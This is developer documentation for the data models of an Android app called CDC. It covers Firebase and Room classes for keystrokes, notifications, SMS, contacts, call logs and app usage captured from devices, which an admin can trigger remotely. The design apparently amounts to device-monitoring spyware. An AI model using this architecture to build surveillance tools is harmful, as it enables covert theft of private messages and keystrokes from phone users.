# Data Models

CDC's data model has two layers: Firebase-facing POJOs (annotated with Lombok `@Data @Builder`) that are serialised to/from RTDB, and Room entity classes (`ApplicationData`, `DeviceData`) that cache the same data locally for offline access. All classes are in the `com.vikasyadavnsit.cdc.data` or `com.vikasyadavnsit.cdc.enums` packages.

## Key Classes

| Class | Layer | Responsibility |
|-------|-------|---------------|
| `User` | Firebase POJO | Root document stored at `cdc/users/<androidId>/` |
| `User.AppSettings` | Firebase POJO | Wrapper holding the `appTriggerSettingsDataMap` |
| `User.AppTriggerSettingsData` | Firebase POJO | Per-action configuration (enabled, repeatable, upload flags, etc.) |
| `User.UserDeviceData` | Firebase POJO | Container for all captured data sub-collections on the device |
| `KeyStrokeData` | Firebase POJO | Single batched keystroke record |
| `NotificationData` | Firebase POJO | Single notification record captured by `AccessibilityUtils` |
| `AppUsageReportData` | Firebase POJO | Per-package daily usage summary with session list |
| `AppUsageData` | Firebase POJO | Supporting class used inside `AppUsageReportData` |
| `AppSession` | Firebase POJO | Start/end timestamps for a single app foreground session |
| `ApplicationData` | Room entity | Caches one `AppTriggerSettingsData` JSON blob per `ClickActions` key |
| `DeviceData` | Room entity | Stores captured data (keystrokes, notifications, usage) for local replay |
| `AppSettings` (standalone) | Firebase POJO | Used in some paths alongside `User.AppSettings` |
| `SpinnerItem` | UI helper | Wraps a display label and an optional `User` for the admin device-selector spinner |
| `DeviceDetails` | Embedded in `User` | Brand, model, Android ID, OS version — set via `CommonUtil.getDeviceDetails()` |
| `ClickActions` | Enum | 16 action identifiers, each carrying a `BiConsumer<Context, AppTriggerSettingsData>` handler and display metadata |
| `FileMap` | Enum | Maps logical data types to file paths, encryption flags, and deduplication keys |
| `ActionStatus` | Enum | `IDLE`, `START`, `STOP`, `PREPARE` — drives state machine in multi-step actions |
| `AppStatus` | Enum | High-level app lifecycle state |
| `LoggingLevel` | Enum | Controls `LoggerUtils` verbosity |

---

## User (root Firebase document)

```java
@Data @Builder
public class User {
    String id;               // UUID generated at createUser()
    String fullName;         // entered by the user at first launch
    Map<String,Object> userDetails;    // reserved
    Map<String,Object> deviceDetails;  // androidId, brand, model, OS — from CommonUtil
    Map<String,Object> userSettings;   // reserved
    AppSettings appSettings;
    UserDeviceData userDeviceData;
}
```

A shallow copy (id + fullName + deviceDetails only) is also written to `cdc/flatUserDetails/<androidId>` so the admin spinner can list all registered devices without reading every full user node.

---

## User.AppSettings

```java
@Data @Builder
public static class AppSettings {
    Map<String, AppTriggerSettingsData> appTriggerSettingsDataMap;
    Map<String, Object> appSettingsMap;  // reserved for future per-app settings
}
```

The `appTriggerSettingsDataMap` key is the `ClickActions.name()` string (e.g., `"CAPTURE_KEY_STROKES"`). Default entries are created by `FirebaseUtils.createAppTriggerSettingsDataMap()` with all actions disabled.

---

## User.AppTriggerSettingsData

The most operationally significant model — every capture decision reads this.

```java
@Data @Builder
public static class AppTriggerSettingsData {
    boolean enabled;            // master on/off; must be true for any capture to happen
    boolean repeatable;         // whether the action repeats
    int maxRepetitions;         // number of repeat cycles (used by screenshot burst)
    long interval;              // ms between repetitions
    ActionStatus actionStatus;  // IDLE / START / STOP / PREPARE
    ClickActions clickActions;  // back-reference to the action enum
    boolean uploadDataSnapshot; // push captured data to Firebase RTDB
    boolean deleteLocalData;    // delete local file after upload
    boolean saveOnLocalFile;    // write captured data to local encrypted file
}
```

This object is stored in two places simultaneously:
- Firebase RTDB under `appSettings/appTriggerSettingsDataMap/<key>`
- Room DB (`ApplicationData` table) as a Gson-serialised JSON string in the `value` column, keyed by `ClickActions.name()`

---

## User.UserDeviceData

Represents the full set of sub-collections under `userDeviceData/`. Each field corresponds to a Firebase path and a capture channel.

| Field | Firebase subpath | Capture source |
|-------|-----------------|----------------|
| `keystrokes` | `.../userDeviceData/keystrokes` | `AccessibilityUtils` |
| `notifications` | `.../userDeviceData/notifications` | `AccessibilityUtils` |
| `sms` | `.../userDeviceData/sms` | `MessageUtils` |
| `contacts` | `.../userDeviceData/contacts` | `MessageUtils` |
| `callLogs` | `.../userDeviceData/callLogs` | `MessageUtils` |
| `appStats` | `.../userDeviceData/appStats` | `AppUsageStats` |
| `fileStructure` | `.../userDeviceData/fileStructure` | `DirectoryMonitor` |
| `sensors` | (file-only, not uploaded) | `CDCSensorService` |
| `screenshots` | (file-only, not uploaded) | `ScreenshotService` |
| `geolocation` | reserved | — |
| `offlineFiles` | reserved | — |
| `deviceStats` | reserved | — |

---

## KeyStrokeData

```java
@Data @Builder
public class KeyStrokeData {
    String appPackage;   // e.g. "com.whatsapp"
    String text;         // full text of the changed field
    String timestamp;    // LocalDateTime.now().toString()
}
```

Uploaded via `FirebaseUtils.uploadUserKeystrokeDataSnapshot()` (Firebase `push()`) and stored locally via `DeviceDataRepository` (Room).

---

## NotificationData

```java
@Data @Builder
public class NotificationData {
    String packageName;
    String timestamp;              // "yyyy-MM-dd hh:mm:ss"
    Map<String,Object> extras;    // Notification.extras or fallback event text
}
```

---

## AppUsageReportData

```java
@Data @Builder
public class AppUsageReportData {
    String packageName;
    int openCount;
    long totalUsageTime;    // ms
    long lastOpenTime;      // epoch ms of last MOVE_TO_FOREGROUND event
    List<AppSession> sessions;
}
```

Uploaded as `Map<date, Map<packageName, AppUsageReportData>>` — the outer map key is the date string, the inner map key is the package name with `.` replaced by `-` (Firebase path constraint).

---

## ClickActions Enum

```java
public enum ClickActions {
    REQUEST_ALL_PERMISSION(1, biConsumer, description, actionLabel),
    RESET_ALL_PERMISSION(2, ...),
    REQUEST_EXACT_ALARM_PERMISSION(3, ...),
    REQUEST_ACCESSIBILITY_PERMISSION(4, ...),
    REQUEST_FILE_ACCESS_PERMISSION(5, ...),
    START_SENSOR_SERVICE(6, ...),
    START_SCREENSHOT_SERVICE(7, ...),
    CAPTURE_ALL_CONTACTS(8, ...),
    CAPTURE_ALL_SMS(9, ...),
    CAPTURE_ALL_CALL_LOGS(10, ...),
    MONITOR_CALL_STATE(11, ...),
    MONITOR_PHONE_STATISTICS(12, ...),
    CAPTURE_KEY_STROKES(13, ...),
    CAPTURE_NOTIFICATIONS(14, ...),
    GET_DIRECTORY_STRUCTURE(15, ...),
    GET_APP_USAGE_STATISTICS_REPORT(16, ...);

    int order;
    BiConsumer<Context, User.AppTriggerSettingsData> biConsumer;
    String description;
    String actionLabel;
}
```

The `biConsumer` is the actual action implementation. It is invoked by:
- `ActionUtils.performFirebaseAction()` (remote trigger from Firebase)
- `SettingsFragment` action tile buttons (local trigger)
- `OfflineClickActionsFragment` (local trigger without device selection)

---

## FileMap Enum

```java
public enum FileMap {
    SMS(        "Documents/CDC", "sms.txt",            isOrganized=true,  checkDup=true,  uid="_id", encrypted=true),
    LOG(        "Documents/CDC", "log.txt",            isOrganized=false, checkDup=false, uid=null,  encrypted=false),
    CALL(       "Documents/CDC", "call.txt",           isOrganized=true,  checkDup=true,  uid="_id", encrypted=true),
    CALL_STATE( "Documents/CDC", "call_state.txt",     isOrganized=false, checkDup=false, uid=null,  encrypted=true),
    KEYSTROKE(  "Documents/CDC", "keystroke.txt",      isOrganized=false, checkDup=false, uid=null,  encrypted=true),
    CONTACTS(   "Documents/CDC", "contacts.txt",       isOrganized=true,  checkDup=true,  uid="_id", encrypted=true),
    APPLICATION_USAGE("Documents/CDC","application_usage.text",false,false,null,false),
    NOTIFICATION("Documents/CDC","notification.txt",   isOrganized=false, checkDup=false, uid=null,  encrypted=false),
    DIRECTORY_STRUCTURE("Documents/CDC","directory_structure.txt",false,false,null,false),
    TEMPORARY_FILE("Documents/CDC","temp.txt",         false,false,null,false);
}
```

- `isOrganized=true` → routed to `CDCOrganisedFileAppender` (deduplication-aware, one-record-per-line)
- `isOrganized=false` → routed to `CDCUnorganisedFileAppender` (buffered queue, byte-limit flush)
- `encrypted=true` → each line is AES-256/CBC encrypted and Base64-encoded before writing

---

## Room Database (`cdc.db`)

Two tables managed by `AppDatabase` (Room):

**ApplicationData** — trigger-settings cache

| Column | Type | Description |
|--------|------|-------------|
| key | String (PK) | `ClickActions.name()` |
| value | String | Gson JSON of `AppTriggerSettingsData` |

**DeviceData** — captured data local log

| Column | Type | Description |
|--------|------|-------------|
| id | Long (PK auto) | Row id |
| value | String | Gson JSON of the captured record |
| fileMapType | FileMap | Which data type this row belongs to |

The database file is stored at `Documents/CDC/db/cdc.db` (custom path via `AppConstants.CDC_DATABASE_PATH`).